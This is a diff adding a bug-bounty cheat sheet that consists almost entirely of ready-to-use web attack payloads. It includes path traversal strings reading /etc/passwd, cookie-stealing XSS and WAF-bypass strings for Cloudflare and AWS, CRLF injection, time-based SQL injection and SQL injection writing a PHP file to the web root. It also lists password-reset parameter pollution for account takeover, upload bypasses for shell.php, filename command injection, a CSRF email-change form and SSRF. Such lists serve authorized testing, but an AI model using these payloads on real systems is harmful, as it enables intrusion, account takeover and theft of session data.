@@ -1,0 +1,259 @@
+
+LFI 
+https://target/download.php?id=../../../../../../../../../etc/passwd
+
+
+XSS Cloudflare Bypass
+
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`/AAAA/`>
+
+File upload bypasses and test-cases brief:
+Upload php
+Upload Different Version .php2 , .php3
+Upload html file
+Upload .phP
+Upload .PHP
+Upload .svg
+Remove Cookies from Upload Request
+Change content-type of request
+Change Magic Byte of File
+
+
+tips 
+https://github.com/alexbieber/Bug_Bounty_writeups
+
+path traversal filter bypass payload list:
+../../../etc/passwd
+/etc/passwd
+...//....//....//etc/passwd
+%252f..%252f..%252fetc/passwd
+/var/www/images/../../../etc/passwd
+../../../etc/passwd%00.png
+
+
+Bug Bounty Hint
+
+Found XSS protection using JQuery,
+while performing source code analysis?
+$('<div></div>').html(text).text();
+
+Try the classic payload:
+text="<img src=1 onerror=alert(1)>"
+
+
+Payloads for DOM XSS
+
+//javascript:alert(1);
+//javascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+
+
+
+html injection with XSS
+
+<h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE
+
+
+Bug: RXSS
+
+payload:
+%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+payload:
+%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+
+Try multiple emails on password reset and check your both email accounts for a mail.
+
+email=victim&email=attacker
+email[]=victim&email[]=attacker
+email=victim,attacker
+{email: victim, email:attacker}
+{email: [victim,attacker]}
+
+
+A filter and regexp bypass payload leveraging JS multifunction (,) by @sratarun
+<x/onpointerenter="confirm,alert(1)">
+
+
+CloudFlare #WAF #XSS #Bypass
+<Svg Only=1 OnLoad=confirm(1)>
+
+
+
+This time i got SQL injection vulnerability to XSS.
+
+Payload :
+concat(0x3c7363726970743e70726f6d70742822,0x3078336e30,0x7c7c,user(),0x7c7c,database(),0x222c646f63756d656e742e636f6f6b6965293c2f7363726970743e)
+
+
+Vulnerability CRLF to XSS @0x3n0
+
+%0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--
+
+
+
+Cloudflare XSS WAF Bypass.
+
+Payload: "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+
+
+Two ways to perform RCE from SQLi:-
+
+id=ddos) union select 1,2,3,4,5,6,7,'<? phpinfo(); ?>’ into outfile ‘/var/www/html/bWAPP/image/phpinfo.php’%23
+
+id=ddos) into outfile ‘/var/www/html/bWAPP/image/phpinfo’ fields terminated by ‘<? phpinfo(); ?>’%23
+
+
+
+AWS WAF Bypass
+
+%22%3E%3Casuka%20AutoFocus%20ContentEditable%20OnFocusIn%3D_%3Dalert%2C_%28document.cookie%29%3E
+
+
+XSS filter bypass payload: \&#34;+confirm(1)+&#34; 
+
+
+
+If the main endpoint is forbidden we can also check for the backup file.
+
+/blog/wp-config.php => 403 Forbidden
+/blog/wp-config.php.bkp => 200 OK
+
+
+File upload WAF bypass:
+/?file=shell.php <-- Blocked
+/?file===shell.php <-- Bypassed
+
+
+
+CSRF doc
+
+<body onload="document.getElementById('form').submit()">
+ <form id="form" action="http://mywebsite/Update" method="post">
+  <input name="email" value="badguy@baddomain.com" />
+</form>
+</body>
+
+
+ASP NET xss
+
+https://target.com/(Z(%22onerror=%22alert`1`%22))/Default.aspx
+
+https://target.com/(Z("><img src%22onerror=%22alert`1`%22))/Default.aspx
+
+
+XSS
+
+"><img src=x onerror=alert(document.cookie);>
+"><img src onerror=alert(1)>
+"><img+src=+xx+onerror=alert(7575)><
+"><img src onerror=alert(document.cookie)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+<svg/onload=alert(123)>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<svg onload=alert%26%230000000040"1")>
+"><script>alert("XSS")</script>
+
+
+SQL TIME
+
+Time-Based:
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+‘;WAITFOR DELAY ‘0:0:30’–
+
+
+Rv5MrBuV')%20OR%20956=(SELECT%20956%20FROM%20PG_SLEEP(6))--
+
+MySQL (string concat and logical ops)
+1' + sleep(10)
+1' and sleep(10)
+1' && sleep(10)
+1' | sleep(10)
+PostgreSQL (only support string concat)
+1' || pg_sleep(10)
+MSQL
+1' WAITFOR DELAY '0:0:10'
+Oracle
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+SQLite
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+
+
+CLICKJACKING 
+
+<html>
+    <head>
+        <title>Clickjack test page</title>
+    </head>
+    <body>
+        <iframe src="http://www.target.com" width="500" height="500"></iframe>
+    </body>
+</html>
+
+
+WORDPRESS
+
+USERS: https://www.target.com/wp-json/wp/v2/users
+
+LOGIN: 
+https://target.com/wp-login.php
+https://target.com/wp-admin
+
+
+SSRF 
+https://www.target.com/wp-json/oembed/1.0/proxy?url=rb69x7rtgks0sf1gvswqj0jh48azyo.burpcollaborator.net
+
+
+DEFAULT PAGE FOUND
+https://www.target.com/readme.html
+https://www.target.com/license.txt
+
+
+INFORMATION DISCLOSURE 
+https://www.target.com/feed/
+
+
+
+SVG 
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
+ preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">
+
+
+exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png
+
+
+File Name Vulnerability:
+Path Traversals: ../../../tmp/lol.png
+SQL Injection: sleep(10) — -.jpg
+XSS: <svg onload=alert(document.comain)>.jpg/png
+Command Injection: ; sleep 10;.jpg
+DOS: Rename your file to a long string and upload, It may cause DOS.
+
+
+
+Gif file content:
+GIF89a/<svg/onload=alert(1)>/=alert(document.domain)//;
+
+Svg file content:
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+
+
+<a href="https://image-link.com/image.jpg" title=""oncut="alert()" rel="lightbox[gallery]">84**00000</a>
+
+1st Injection: */</script><!--
+2nd Injection: */.domain)/*xxx
+3rd Injection:*/(document/*xx
+4th Injection: */prompt/*xxxxx
+5th Injection: "><script>/*xss
+
